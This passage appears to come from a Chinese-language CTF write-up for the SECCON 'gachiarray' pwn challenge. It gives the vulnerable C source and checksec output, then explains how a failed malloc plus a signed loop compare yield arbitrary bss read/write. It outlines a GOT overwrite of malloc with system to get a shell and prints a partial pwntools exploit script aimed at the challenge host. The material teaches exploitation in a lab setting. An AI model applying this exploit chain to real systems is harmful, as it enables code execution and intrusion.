</span></span><span class=line><span class=cl><span class=p>}</span> <span class=kt>pkt_t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint32_t</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint32_t</span> <span class=n>capacity</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int32_t</span> <span class=n>initial</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int32_t</span> <span class=o>*</span><span class=n>data</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>g_array</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>fatal</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>msg</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[ERROR] %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>msg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>read_packet</span><span class=p>(</span><span class=kt>pkt_t</span> <span class=o>*</span><span class=n>pkt</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>pkt</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>pkt_t</span><span class=p>))</span> <span class=o>!=</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>pkt_t</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nf>fatal</span><span class=p>(</span><span class=s>&#34;Truncated input&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>array_init</span><span class=p>(</span><span class=kt>pkt_t</span> <span class=o>*</span><span class=n>pkt</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>pkt</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&gt;</span> <span class=n>pkt</span><span class=o>-&gt;</span><span class=n>capacity</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pkt</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>=</span> <span class=n>pkt</span><span class=o>-&gt;</span><span class=n>capacity</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>g_array</span><span class=p>.</span><span class=n>data</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=n>pkt</span><span class=o>-&gt;</span><span class=n>capacity</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>int</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>g_array</span><span class=p>.</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)</span><span class=n>pkt</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>g_array</span><span class=p>.</span><span class=n>size</span> <span class=o>=</span> <span class=n>pkt</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>g_array</span><span class=p>.</span><span class=n>capacity</span> <span class=o>=</span> <span class=n>pkt</span><span class=o>-&gt;</span><span class=n>capacity</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>g_array</span><span class=p>.</span><span class=n>initial</span> <span class=o>=</span> <span class=n>pkt</span><span class=o>-&gt;</span><span class=n>initial</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=kt>size_t</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>pkt</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>g_array</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>pkt</span><span class=o>-&gt;</span><span class=n>initial</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Initialized: size=%d capacity=%d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>pkt</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>,</span> <span class=n>pkt</span><span class=o>-&gt;</span><span class=n>capacity</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>pkt_t</span> <span class=n>pkt</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>read_packet</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pkt</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>array_init</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pkt</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>read_packet</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pkt</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=p>(</span><span class=n>pkt</span><span class=p>.</span><span class=n>op</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>1</span><span class=o>:</span> <span class=c1>// get
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=n>g_array</span><span class=p>.</span><span class=n>size</span> <span class=o>&lt;=</span> <span class=n>pkt</span><span class=p>.</span><span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=nf>fatal</span><span class=p>(</span><span class=s>&#34;Out-of-bounds&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;array[%d] = %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>pkt</span><span class=p>.</span><span class=n>index</span><span class=p>,</span> <span class=n>g_array</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>pkt</span><span class=p>.</span><span class=n>index</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>2</span><span class=o>:</span> <span class=c1>// set
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=n>g_array</span><span class=p>.</span><span class=n>size</span> <span class=o>&lt;=</span> <span class=n>pkt</span><span class=p>.</span><span class=n>index</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=nf>fatal</span><span class=p>(</span><span class=s>&#34;Out-of-bounds&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>g_array</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>pkt</span><span class=p>.</span><span class=n>index</span><span class=p>]</span> <span class=o>=</span> <span class=n>pkt</span><span class=p>.</span><span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;array[%d] = %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>pkt</span><span class=p>.</span><span class=n>index</span><span class=p>,</span> <span class=n>pkt</span><span class=p>.</span><span class=n>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>3</span><span class=o>:</span> <span class=c1>// resize
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=n>g_array</span><span class=p>.</span><span class=n>capacity</span> <span class=o>&lt;</span> <span class=n>pkt</span><span class=p>.</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=nf>fatal</span><span class=p>(</span><span class=s>&#34;Over capacity&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>g_array</span><span class=p>.</span><span class=n>size</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>pkt</span><span class=p>.</span><span class=n>size</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=n>g_array</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>g_array</span><span class=p>.</span><span class=n>initial</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>g_array</span><span class=p>.</span><span class=n>size</span> <span class=o>=</span> <span class=n>pkt</span><span class=p>.</span><span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;New size set to %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>pkt</span><span class=p>.</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>程序保护</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>    Arch:       amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
</span></span><span class=line><span class=cl>    Stack:      No canary found
</span></span><span class=line><span class=cl>    NX:         NX enabled
</span></span><span class=line><span class=cl>    PIE:        No PIE <span class=o>(</span>0x400000<span class=o>)</span>
</span></span><span class=line><span class=cl>    FORTIFY:    Enabled
</span></span><span class=line><span class=cl>    SHSTK:      Enabled
</span></span><span class=line><span class=cl>    IBT:        Enabled
</span></span><span class=line><span class=cl>    Stripped:   No
</span></span></code></pre></div><p>看似有很多<code>signed compare</code>，看了汇编，实际上绝大多数都是<code>unsigned compare</code>，只有一个是<code>signed compare</code>，就是这个<code>for</code>循环</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>g_array</span><span class=p>.</span><span class=n>size</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>pkt</span><span class=p>.</span><span class=n>size</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=n>g_array</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>g_array</span><span class=p>.</span><span class=n>initial</span><span class=p>;</span>
</span></span></code></pre></div><p>而漏洞点是</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=n>g_array</span><span class=p>.</span><span class=n>data</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=n>pkt</span><span class=o>-&gt;</span><span class=n>capacity</span> <span class=o>*</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>int</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>g_array</span><span class=p>.</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=kt>uint64_t</span><span class=o>*</span><span class=p>)</span><span class=n>pkt</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span></code></pre></div><p><code>malloc</code>失败后并没有直接<code>error</code>，只是把<code>*pkt = 0</code></p><p>如果我们输入<code>capacity</code>为<code>-1</code>，那<code>capacity</code>后面就会是一个非常大的整数，<code>malloc</code>也会失败，通过<code>case3</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=k>case</span> <span class=mi>3</span><span class=o>:</span> <span class=c1>// resize
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=n>g_array</span><span class=p>.</span><span class=n>capacity</span> <span class=o>&lt;</span> <span class=n>pkt</span><span class=p>.</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=nf>fatal</span><span class=p>(</span><span class=s>&#34;Over capacity&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>g_array</span><span class=p>.</span><span class=n>size</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>pkt</span><span class=p>.</span><span class=n>size</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=n>g_array</span><span class=p>.</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>g_array</span><span class=p>.</span><span class=n>initial</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>g_array</span><span class=p>.</span><span class=n>size</span> <span class=o>=</span> <span class=n>pkt</span><span class=p>.</span><span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;New size set to %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>pkt</span><span class=p>.</span><span class=n>size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span></code></pre></div><p>也能成功把<code>size</code>给<code>resize</code>成一个特别大的整数（比如<code>-2</code>）（这个<code>for</code>循环是<code>signed compare</code>很关键，输入<code>size</code>为<code>-2</code>不会进行任何一次赋值，也就不会进行非法内存的写入，不会循环<code>pow(2, 32) - 2</code>次直接爆掉）</p><p>又因为这题是<code>NO PIE</code>，所以现在已经可以<code>bss</code>任意读写了。</p><p>通过<code>got</code>泄露<code>libc</code></p><p>写<code>malloc</code>为<code>system</code>，<code>exit</code>为<code>main</code>，再往<code>bss</code>地址存个<code>/bin/sh</code></p><p>触发<code>exit</code>再次进入<code>main</code>函数，然后输入的<code>capacity</code>为<code>bss // 4</code>即可<code>get shell</code></p><p>exp</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwncli</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#context.terminal = [&#39;tmux&#39;, &#39;new-window&#39;, &#39;-n&#39;, &#39;debug&#39; ]</span>
</span></span><span class=line><span class=cl><span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;chall&#34;</span> <span class=o>+</span> <span class=s2>&#34;_patched&#34;</span>
</span></span><span class=line><span class=cl><span class=n>libcname</span> <span class=o>=</span> <span class=s2>&#34;/home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/libc6_2.39-0ubuntu8.4_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;gachiarray.seccon.games&#34;</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>5000</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>libcname</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>libcname</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>b *0x4013FE
</span></span></span><span class=line><span class=cl><span class=s1>set debug-file-directory /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/libc6-dbg_2.39-0ubuntu8.4_amd64/usr/lib/debug
</span></span></span><span class=line><span class=cl><span class=s1>set directories /home/wgg/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/glibc-source_2.39-0ubuntu8.4_all/usr/src/glibc/glibc-2.39
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>base</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>offset</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;canary&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>data</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mi>2</span><span class=p>)</span> <span class=o>-</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>base</span> <span class=o>=</span> <span class=n>data</span> <span class=o>-</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s2> = &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>base</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>format_extract</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;0x[0-9a-fA-F]</span><span class=si>{12}</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sa</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sla</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ru</span><span class=p>(</span><span class=n>io</span><span class=p>,</span> <span class=n>a</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span> <span class=o>=</span> <span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>args</span><span class=o>.</span><span class=n>REMOTE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>recv_number</span><span class=p>(</span><span class=n>io</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>buf</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># 每次只读 1 个字节</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>c</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mf>0.5</span><span class=p>)</span> <span class=c1># 设置个 timeout 防止卡死</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>c</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 如果是数字，或者是开头的负号</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>c</span><span class=o>.</span><span class=n>isdigit</span><span class=p>()</span> <span class=ow>or</span> <span class=p>(</span><span class=n>c</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;-&#39;</span> <span class=ow>and</span> <span class=n>buf</span> <span class=o>==</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>buf</span> <span class=o>+=</span> <span class=n>c</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># 遇到了非数字（比如空格、换行、字母）</span>
</span></span><span class=line><span class=cl>            <span class=c1># 【关键】把这个字符放回去，给后面的逻辑用</span>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>unrecv</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>buf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span> <span class=c1># 或者抛出异常</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_packet</span><span class=p>(</span><span class=n>field1</span><span class=p>,</span> <span class=n>field2</span><span class=p>,</span> <span class=n>field3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    通用发包函数。
</span></span></span><span class=line><span class=cl><span class=s2>    因为是 Union 结构，我们总是发送 3 个 32位整数 (共12字节)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># p32() 将整数转换为 4字节的小端序二进制数据</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>field1</span><span class=p>,</span> <span class=n>sign</span><span class=o>=</span><span class=s1>&#39;signed&#39;</span><span class=p>)</span> <span class=o>+</span> \
</span></span><span class=line><span class=cl>              <span class=n>p32</span><span class=p>(</span><span class=n>field2</span><span class=p>,</span> <span class=n>sign</span><span class=o>=</span><span class=s1>&#39;signed&#39;</span><span class=p>)</span> <span class=o>+</span> \
</span></span><span class=line><span class=cl>              <span class=n>p32</span><span class=p>(</span><span class=n>field3</span><span class=p>,)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>malloc_got</span> <span class=o>=</span> <span class=mh>0x404010</span>
</span></span><span class=line><span class=cl><span class=n>exit_got</span> <span class=o>=</span> <span class=mh>0x404020</span>
</span></span><span class=line><span class=cl><span class=n>rbp_ret</span> <span class=o>=</span> <span class=mh>0x000000000040134d</span>
</span></span><span class=line><span class=cl><span class=n>printf_got</span> <span class=o>=</span> <span class=mh>0x404018</span>
</span></span><span class=line><span class=cl><span class=n>main</span> <span class=o>=</span> <span class=mh>0x4010F0</span>
</span></span><span class=line><span class=cl><span class=n>bss</span> <span class=o>=</span> <span class=mh>0x404200</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>create_packet</span><span class=p>(</span><span class=o>-</span><span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0xAAAA</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>create_packet</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=o>-</span><span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>create_packet</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>malloc_got</span> <span class=o>//</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
